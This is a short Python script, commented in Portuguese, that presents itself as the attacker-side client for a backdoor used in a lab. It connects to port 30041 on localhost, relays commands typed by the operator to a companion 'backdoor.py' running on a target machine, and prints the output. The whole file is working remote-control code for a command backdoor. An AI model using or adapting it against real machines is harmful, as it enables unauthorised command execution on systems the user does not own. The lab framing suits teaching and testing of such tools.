#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cliente de teste do backdoor (lado atacante) - uso em laboratório.
Conecta na porta 30041 e envia comandos para a máquina-alvo.
"""

import socket

HOST = "127.0.0.1"
PORT = 30041
BUFFER = 65536


def receber(sock: socket.socket) -> str:
    return sock.recv(BUFFER).decode(errors="ignore")


def main() -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cliente:
        try:
            cliente.connect((HOST, PORT))
        except ConnectionRefusedError:
            print("[!] Conexão recusada. O backdoor.py está rodando?")
            return

        print(receber(cliente), end="")
        while True:
            prompt = receber(cliente)
            comando = input(prompt)
            cliente.sendall(comando.encode(errors="ignore"))
            if comando.strip().lower() in ("sair", "exit", "quit"):
                break
            print(receber(cliente), end="\n")


if __name__ == "__main__":
    main()
